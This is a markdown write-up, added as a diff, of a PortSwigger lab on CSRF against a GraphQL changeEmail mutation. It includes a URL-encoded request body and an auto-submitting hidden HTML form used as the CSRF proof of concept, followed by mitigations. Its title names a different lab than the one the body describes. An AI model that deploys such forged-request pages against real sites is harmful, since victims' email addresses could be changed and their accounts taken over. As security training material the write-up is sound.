@@ -1,0 +1,354 @@
+# PortSwigger Web Security Academy
+
+## Lab: CSRF where token validation depends on request method
+
+## Objective
+
+The objective of this lab was to exploit a Cross-Site Request Forgery (CSRF) vulnerability affecting a GraphQL mutation responsible for changing the authenticated user's email address.
+
+The application accepted the GraphQL `changeEmail` mutation through a `POST` request using `application/x-www-form-urlencoded` without requiring a CSRF token or equivalent anti-CSRF mechanism.
+
+This allowed an attacker to construct a malicious HTML page capable of submitting the request on behalf of an authenticated victim.
+
+---
+
+# Technologies Involved
+
+* GraphQL
+* GraphQL mutations
+* HTTP/2
+* HTTP POST requests
+* `application/x-www-form-urlencoded`
+* HTML forms
+* JavaScript
+* Burp Suite Community Edition
+* CSRF
+
+---
+
+# Reconnaissance
+
+After authenticating to the application, the account functionality was inspected.
+
+A new email address was submitted through the account settings page.
+
+The corresponding request was intercepted using:
+
+```text
+Proxy → HTTP history
+```
+
+The request revealed that the email modification was performed through a GraphQL mutation.
+
+The relevant GraphQL operation was:
+
+```graphql
+mutation changeEmail($input: ChangeEmailInput!) {
+    changeEmail(input: $input) {
+        email
+    }
+}
+```
+
+The request initially used JSON:
+
+```http
+POST /graphql/v1 HTTP/2
+Content-Type: application/json
+```
+
+The variables contained the email address to be applied to the account.
+
+---
+
+# Identification
+
+The GraphQL request was sent to Burp Suite Repeater.
+
+The email address was modified and the request was replayed using the same authenticated session cookie.
+
+The server accepted the request and changed the email address again.
+
+This demonstrated that the authenticated session could be reused to perform the state-changing operation.
+
+The next step was to determine whether the request could be transformed into a format that could be triggered from an external web page.
+
+---
+
+# Request Method and Content-Type Manipulation
+
+The GraphQL request was converted from JSON to a URL-encoded POST request.
+
+The resulting request used:
+
+```http
+POST /graphql/v1 HTTP/2
+Content-Type: application/x-www-form-urlencoded
+```
+
+The GraphQL query was supplied as a form parameter:
+
+```text
+query=<GraphQL mutation>
+```
+
+along with:
+
+```text
+operationName=changeEmail
+```
+
+and:
+
+```text
+variables=<JSON parameters>
+```
+
+A successful request used the following structure:
+
+```text
+query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22test3%40example.com%22%7D%7D
+```
+
+The request was successfully replayed in Burp Repeater and the email address was modified.
+
+This confirmed that the GraphQL mutation could be triggered using a standard HTML form-compatible content type.
+
+---
+
+# CSRF Exploitation
+
+Because the application accepted the state-changing operation through a URL-encoded POST request, a CSRF proof of concept could be created manually using an HTML form.
+
+The malicious page contained a form targeting the vulnerable GraphQL endpoint:
+
+```html
+<form action="https://LAB-ID.web-security-academy.net/graphql/v1" method="POST">
+    <input type="hidden" name="query" value="
+        mutation changeEmail($input: ChangeEmailInput!) {
+            changeEmail(input: $input) {
+                email
+            }
+        }">
+    <input type="hidden" name="operationName" value="changeEmail">
+    <input type="hidden" name="variables" value='{"input":{"email":"victim-changed@example.com"}}'>
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+The JavaScript automatically submitted the form when the victim loaded the malicious page.
+
+No session cookie was included in the exploit.
+
+This is important because the attack relies on the victim's browser automatically supplying the authentication context when making the request to the target application.
+
+---
+
+# Attack Flow
+
+The complete attack can be represented as follows:
+
+```text
+Attacker-controlled page
+          ↓
+HTML form automatically submitted
+          ↓
+POST /graphql/v1
+          ↓
+changeEmail GraphQL mutation
+          ↓
+Victim's authenticated browser context
+          ↓
+Application accepts mutation
+          ↓
+Victim's email address modified
+```
+
+The attacker therefore does not need to obtain the victim's session cookie.
+
+---
+
+# Evidence
+
+The original GraphQL mutation successfully modified the email address when replayed through Burp Repeater.
+
+The same operation was then embedded into a malicious HTML form.
+
+The exploit was hosted on the PortSwigger exploit server and delivered to the victim.
+
+After the victim processed the malicious page, the email address was changed to the attacker-controlled value.
+
+This confirmed successful exploitation of the CSRF vulnerability.
+
+---
+
+# Root Cause
+
+The root cause was the absence of effective CSRF protection on a state-changing GraphQL mutation.
+
+The `changeEmail` mutation modified sensitive account information but did not require a CSRF token or another reliable mechanism to verify that the request originated from the legitimate application.
+
+The application therefore trusted an authenticated request based primarily on the victim's session context.
+
+Additionally, the endpoint accepted the mutation using:
+
+```http
+Content-Type: application/x-www-form-urlencoded
+```
+
+which made it possible to construct the request using a standard HTML form.
+
+The fundamental security issue was not GraphQL itself. GraphQL mutations can be vulnerable to CSRF just like conventional state-changing HTTP endpoints when appropriate protections are not implemented.
+
+---
+
+# Impact
+
+Successful exploitation allows an attacker to perform unauthorized actions using the victim's authenticated session.
+
+In this lab, the attacker could change the victim's email address.
+
+Potential real-world consequences include:
+
+* Account takeover.
+* Modification of account recovery information.
+* Unauthorized changes to security settings.
+* Loss of account control.
+* Chaining with password-reset functionality.
+* Unauthorized modification of other sensitive account attributes.
+
+If the modified email address can subsequently be used for password recovery, the vulnerability could potentially be escalated from unauthorized state modification to full account takeover.
+
+---
+
+# Mitigations
+
+## 1. Implement CSRF tokens
+
+Every state-changing request should include a cryptographically secure CSRF token tied to the user's session.
+
+For example:
+
+```text
+POST /graphql/v1
+
+CSRF-Token: <unique-token>
+```
+
+The server must validate the token before executing the mutation.
+
+---
+
+## 2. Use SameSite cookies
+
+Authentication cookies should use an appropriate `SameSite` attribute.
+
+For example:
+
+```http
+Set-Cookie: session=<value>; Secure; HttpOnly; SameSite=Lax
+```
+
+For applications requiring stricter cross-site protections, `SameSite=Strict` may be appropriate.
+
+SameSite cookies should be considered an additional defense rather than the only CSRF mitigation.
+
+---
+
+## 3. Validate the Origin header
+
+The server can validate the `Origin` header for sensitive state-changing operations.
+
+Requests originating from unexpected domains should be rejected.
+
+For example:
+
+```text
+Origin: https://trusted-application.example
+```
+
+should be accepted, while an unexpected external origin should be rejected.
+
+---
+
+## 4. Protect GraphQL mutations
+
+GraphQL APIs should explicitly classify mutations according to their security impact.
+
+Operations such as:
+
+```graphql
+changeEmail
+changePassword
+deleteAccount
+updateProfile
+```
+
+should receive appropriate CSRF protection.
+
+GraphQL should not be considered inherently protected against CSRF simply because the application uses a GraphQL endpoint.
+
+---
+
+## 5. Avoid relying exclusively on Content-Type restrictions
+
+Applications sometimes attempt to mitigate CSRF by accepting only JSON requests.
+
+However, security controls should be enforced server-side rather than relying solely on the expected request format.
+
+If an endpoint accepts multiple content types, each supported format must receive the same security protections.
+
+---
+
+## 6. Require re-authentication for highly sensitive operations
+
+For particularly sensitive account changes, such as changing an email address or password, the application should consider requiring:
+
+* Current password verification.
+* MFA confirmation.
+* Recent authentication.
+* Explicit confirmation.
+
+This provides an additional layer of protection even if another vulnerability bypasses CSRF defenses.
+
+---
+
+# Classifications
+
+### CWE-352 — Cross-Site Request Forgery (CSRF)
+
+The primary classification for this vulnerability.
+
+The application allowed an attacker-controlled webpage to cause a state-changing request to be executed using the victim's authenticated session.
+
+### OWASP Top 10 — A01: Broken Access Control
+
+The vulnerability can result in unauthorized modification of authenticated user data.
+
+### OWASP API Security
+
+The issue demonstrates insufficient protection of a state-changing API operation against cross-origin requests.
+
+---
+
+# Conclusions
+
+The application exposed a GraphQL `changeEmail` mutation that modified sensitive account information without implementing adequate CSRF protection.
+
+The mutation was initially observed as a JSON GraphQL request. By converting the request to:
+
+```http
+POST /graphql/v1
+Content-Type: application/x-www-form-urlencoded
+```
+
+the GraphQL operation could be represented as standard HTML form parameters.
+
+A malicious HTML page was then created to automatically submit the request.
+
+When delivered to the victim, the browser executed the GraphQL mutation in the context of the authenticated session, causing the victim's email address to be changed.
+
+The key security lesson is that **GraphQL does not inherently prevent CSRF**. Any state-changing mutation that relies on browser authentication must be protected against cross-site request forgery using appropriate server-side controls.
